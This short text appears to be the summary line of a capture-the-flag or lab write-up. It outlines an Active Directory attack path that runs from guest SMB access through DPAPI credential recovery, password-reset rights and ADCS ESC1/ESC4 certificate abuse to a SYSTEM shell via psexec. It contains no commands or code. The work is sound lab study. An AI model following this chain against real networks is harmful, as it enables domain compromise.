## ONE-LINE PATH SUMMARY
guest SMB -> IT share -> RoE PDF (anderson.w) -> DPAPI (alex.o) -> ForceChangePassword (jake.h)
-> ADCS ESC1/ESC4 via jake.h's PKI groups -> admin cert -> PKINIT NT hash -> psexec SYSTEM -> flags.
